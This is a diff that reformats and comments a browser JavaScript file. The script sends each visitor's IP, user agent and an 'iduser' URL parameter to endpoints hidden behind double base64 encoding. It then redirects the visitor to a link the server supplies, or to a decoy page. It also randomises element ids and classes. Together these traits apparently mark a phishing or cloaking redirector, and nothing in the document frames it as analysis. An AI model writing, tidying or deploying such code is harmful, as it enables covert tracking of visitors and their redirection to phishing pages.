@@ -1,147 +1,163 @@
-          function getRandomInt(min, max) {
-                return Math.floor(Math.random() * (max - min)) + min;
-            }
+// Generates a random integer between min (inclusive) and max (exclusive)
+function getRandomInt(min, max) {
+    return Math.floor(Math.random() * (max - min)) + min;
+}
 
-            function addRandomIdAndClass() {
-                const allElements = document.querySelectorAll("*");
+// Adds random ID and class to all elements without an ID or class
+function addRandomIdAndClass() {
+    const allElements = document.querySelectorAll("*");
 
-                allElements.forEach((element) => {
-                    if (!element.id) {
-                        element.id = "value-id-" + getRandomInt(10000, 99999);
-                    }
-                    if (!element.classList.length) {
-                        element.classList.add("value-class-" + getRandomInt(10000, 99999));
-                    }
-                });
-            }
+    allElements.forEach((element) => {
+        if (!element.id) {
+            element.id = "value-id-" + getRandomInt(10000, 99999);
+        }
+        if (!element.classList.length) {
+            element.classList.add("value-class-" + getRandomInt(10000, 99999));
+        }
+    });
+}
 
-            window.onload = function () {
-                addRandomIdAndClass();
-            };
-            function acceptCookies() {
-                console.log("Cookies accepted");
-            }
+// Placeholder function to log acceptance of cookies
+function acceptCookies() {
+    console.log("Cookies accepted");
+}
 
-            function getUrlParameter(name) {
-                name = name.replace(/[[]/, "\\[").replace(/[\]]/, "\\]");
-                var regex = new RegExp("[\\?&]" + name + "=([^&#]*)");
-                var results = regex.exec(window.location.search);
-                return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
-            }
-          
-            function doubleDecode(base64String) {
-                return atob(atob(base64String));
-            }
-            
-			async function getUserIP() {
-                try {
-                    const response = await fetch("https://api.ipify.org?format=json");
-                    const data = await response.json();
-                    return data.ip;
-                } catch (error) {
-                    console.error("Error getting user IP:", error);
-                    return null;
-                }
-            }
-			
-			async function sendData(ip, userid) {
-                try {
-                    const userAgent = navigator.userAgent;
-                    const postData = {
-                        userid: userid,
-                        ip: ip,
-                        userAgent: userAgent,
-                    };
-            
-                    const encodedDomains = [
-					"YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", 
-					"YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", 
-					"YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", 
-					"YUhSMGNITTZMeTl0YjJKcGJHVXVjR1ZsYm1WMExtWnA",
-					"YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"];
-					
-                    const randomDomain = doubleDecode(encodedDomains[Math.floor(Math.random() * encodedDomains.length)]);
-                    console.error(randomDomain);
- 				    const response = await fetch(randomDomain, { 
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
-                        },
-                        body: JSON.stringify(postData),
-                    });
-            
-                    if (!response.ok) {
-                        throw new Error("Network response was not ok");
-                    }
-            
-                    const result = await response.json();
-                    handleResponse(result);
-                } catch (error) {
-                    console.error("Error:", error);
-                }
-            }
+// Retrieves a URL parameter value by name
+function getUrlParameter(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name) || "";
+}
 
-			async function sendMata_black(ip) {
-                try {
-                    const userAgent = navigator.userAgent;
-                    const postData = {
-                        localblock: "invalid",
-                        ip: ip,
-                        userAgent: userAgent,
-                    };
-                    const encodedDomains = [
-					"YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", 
-					"YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", 
-					"YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", 
-					"YUhSMGNITTZMeTl0YjJKcGJHVXVjR1ZsYm1WMExtWnA",
-					"YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"];
+// Decodes a Base64 string twice
+function doubleDecode(base64String) {
+    return atob(atob(base64String));
+}
 
-                    const randomDomain = doubleDecode(encodedDomains[Math.floor(Math.random() * encodedDomains.length)]);
-                    const response = await fetch(randomDomain, { 
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json",
-                        },
-                        body: JSON.stringify(postData),
-                    });
-            
-                    if (!response.ok) {
-                        throw new Error("Network response was not ok");
-                    }
-            
-                    const result = await response.json();
-                    handleResponse(result);
-                } catch (error) {
-                    console.error("Error:", error);
-                }
-            }
+// Fetches the user's IP address using an external API
+async function getUserIP() {
+    try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error("Error getting user IP:", error);
+        return null;
+    }
+}
 
-            function handleResponse(responseData) {
-                if (!responseData) {
-                    console.error("Response data is undefined or null");
-                    return;
-                }
+// Sends user data to a randomly selected domain
+async function sendData(ip, userid) {
+    try {
+        const userAgent = navigator.userAgent;
+        const postData = {
+            userid: userid,
+            ip: ip,
+            userAgent: userAgent,
+        };
 
-                console.error(responseData);
+        const encodedDomains = [
+            "YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", 
+            "YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", 
+            "YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", 
+            "YUhSMGNITTZMeTl0YjJKcGJHVXVjR1ZsYm1WMExtWnA",
+            "YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"
+        ];
 
-                if (responseData.res_status === "200") {
-                    window.location.href = responseData.link + "?iduser=" + responseData.nuser;
-                } else if (responseData.res_status === "405") {
-                    window.location.href = "https://example.com/";
-                } else {
-                    console.error("Unexpected response from server");
-                }
-            }
+        const randomDomain = doubleDecode(encodedDomains[Math.floor(Math.random() * encodedDomains.length)]);
+        console.error("Sending data to domain:", randomDomain);
 
-            getUserIP().then((ip) => {
-                if (ip) {
-                    const userid = getUrlParameter("iduser");
-                    if (userid) {
-                        sendData(ip, userid);
-                    } else {
-                        sendMata_black(ip);
-                    }
-                } else {
-                    console.error("Error: Unable to retrieve IP");
-                }
-            });
+        const response = await fetch(randomDomain, { 
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(postData),
+        });
+
+        if (!response.ok) {
+            throw new Error("Network response was not ok");
+        }
+
+        const result = await response.json();
+        handleResponse(result);
+    } catch (error) {
+        console.error("Error in sendData:", error);
+    }
+}
+
+// Sends alternative data to a randomly selected domain if no userid is provided
+async function sendMata_black(ip) {
+    try {
+        const userAgent = navigator.userAgent;
+        const postData = {
+            localblock: "invalid",
+            ip: ip,
+            userAgent: userAgent,
+        };
+
+        const encodedDomains = [
+            "YUhSMGNITTZMeTlqTG14aGRIUmxZWEowTG1acA", 
+            "YUhSMGNITTZMeTlsWVhONUxXMXZZbWxzWlM1emFEZ3VibTg", 
+            "YUhSMGNITTZMeTlsWVhONUxtRnlhMkZrTG01MQ", 
+            "YUhSMGNITTZMeTl0YjJKcGJHVXVjR1ZsYm1WMExtWnA",
+            "YUhSMGNITTZMeTl2Y0M1eVlYQnBaR1V1Wm1r"
+        ];
+
+        const randomDomain = doubleDecode(encodedDomains[Math.floor(Math.random() * encodedDomains.length)]);
+        console.error("Sending meta data to domain:", randomDomain);
+
+        const response = await fetch(randomDomain, { 
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(postData),
+        });
+
+        if (!response.ok) {
+            throw new Error("Network response was not ok");
+        }
+
+        const result = await response.json();
+        handleResponse(result);
+    } catch (error) {
+        console.error("Error in sendMata_black:", error);
+    }
+}
+
+// Processes the server's response and redirects based on the status
+function handleResponse(responseData) {
+    if (!responseData) {
+        console.error("Response data is undefined or null");
+        return;
+    }
+
+    console.error("Server response:", responseData);
+
+    if (responseData.res_status === "200") {
+        window.location.href = responseData.link + "?iduser=" + responseData.nuser;
+    } else if (responseData.res_status === "405") {
+        window.location.href = "https://example.com/";
+    } else {
+        console.error("Unexpected response from server");
+    }
+}
+
+// Executes when the window is loaded
+window.onload = function () {
+    addRandomIdAndClass();
+};
+
+// Fetches the user's IP and sends data based on URL parameters
+getUserIP().then((ip) => {
+    if (ip) {
+        const userid = getUrlParameter("iduser");
+        if (userid) {
+            sendData(ip, userid);
+        } else {
+            sendMata_black(ip);
+        }
+    } else {
+        console.error("Error: Unable to retrieve IP");
+    }
+});
